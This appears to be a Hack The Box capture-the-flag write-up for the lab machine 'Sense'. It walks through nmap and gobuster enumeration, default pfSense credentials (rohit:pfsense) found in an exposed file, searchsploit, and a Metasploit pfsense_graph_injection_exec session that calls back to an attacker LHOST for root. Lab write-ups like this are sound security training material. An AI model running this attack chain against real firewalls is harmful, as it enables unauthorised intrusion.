![logo](/logo.png)

# [Sense- BOX]  
Hi folks, today I am going to solve an Easy rated hack the box machine which was released on 21 Oct 2017 as the tenth machine on HTB,Sense created by [lkys37en](https://app.hackthebox.com/users/709) .So without any further intro, let'sf jump in.

# common enumeration

## Nmap
  *http
  *Pfsense
  *OpenBSD
  
###### code-nmap

```code
nmap -sV -sC -oA nmap/sense 10.10.10.60
```

###### Output 

![](/Linux/Linux-Easy/OpenBSD/Sense/Screenshots/nmap.png)

```sh
 nmap -sV -sC -oA nmap/sense 10.10.10.60                                                                                           ─╯
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-29 18:46 EAT
Nmap scan report for 10.10.10.60
Host is up (0.33s latency).
Not shown: 998 filtered tcp ports (no-response)
PORT    STATE SERVICE  VERSION
80/tcp  open  http     lighttpd 1.4.35
|_http-title: Did not follow redirect to https://10.10.10.60/
|_http-server-header: lighttpd/1.4.35
443/tcp open  ssl/http lighttpd 1.4.35
|_http-server-header: lighttpd/1.4.35
| ssl-cert: Subject: commonName=Common Name (eg, YOUR name)/organizationName=CompanyName/stateOrProvinceName=Somewhere/countryName=US
| Not valid before: 2017-10-14T19:21:35
|_Not valid after:  2023-04-06T19:21:35
|_http-title: Login
|_ssl-date: TLS randomness does not represent time

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 64.73 seconds
```

looking at the results  we find out that there are 2 ports open and its a `OpenBSD`and its running an `lighttpd`. 

port[80]-  http
port[443]-http

So when we go the browser at [http://10.10.10.60](http://10.10.10.60)  looking at the browser we find a page that we have to connect a certificate.

![](/Linux/Linux-Easy/OpenBSD/Sense/Screenshots/ssl.png)

and  we find the certificate but nothing of important 

![](/Linux/Linux-Easy/OpenBSD/Sense/Screenshots/certificate.png)

and we find a browser with a login credentials of `Pf Sense`

![](/Linux/Linux-Easy/OpenBSD/Sense/Screenshots/sense.png)

so lets start a `gobuster` to enumerate all directories 

```sh
gobuster dir -u https://10.10.10.60 -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words-lowercase.txt -k --no-error 
```

![](/Linux/Linux-Easy/OpenBSD/Sense/Screenshots/gobuster.png)

with the lowercase medium wordlist, finds a `changelog.txt` file which states 2 of 3
vulnerabilities have been patched. It also finds a `system-user.txt` creds:`rohit:pfsense

![](/Linux/Linux-Easy/OpenBSD/Sense/Screenshots/systemuser.png)

By using the credential above we then log into the account

![](/Linux/Linux-Easy/OpenBSD/Sense/Screenshots/logiin.png)

Many of the endpoings in the web gui are not actually implemented. There’s nothing in the Interfaces, Firewall, Services, VPN, Diagnostics, or Help menus. System only has Logout. There is a full menu in Status:

I get a `Graph RDS` which by searching it has a vulnerability 

![](/Linux/Linux-Easy/OpenBSD/Sense/Screenshots/graph.png)

```sh
searchsploit pfsense
```

![](/Linux/Linux-Easy/OpenBSD/Sense/Screenshots/searchsploit.png)

lets examine the exploit

```sh
searchsploit -m 43560
```

![](/Linux/Linux-Easy/OpenBSD/Sense/Screenshots/python.png)

looking at the exploit its `encoding payload to octal`

okay lets start `meterpreter`

```sh
search pfsense_graph_injection_exec
use 0
show options
set PASSWORD pfsense
set RHOST 10.10.10.60
set RPORT 443
set USERNAME rohit
set LHOST 10.10.14.15
```

Then just like that we get the `meterpreter`

![](/Linux/Linux-Easy/OpenBSD/Sense/Screenshots/meterpreter.png)

since it root lets get the flags

![](/Linux/Linux-Easy/OpenBSD/Sense/Screenshots/flags.png)

	-------------------------END successful attack @lesley----------------------






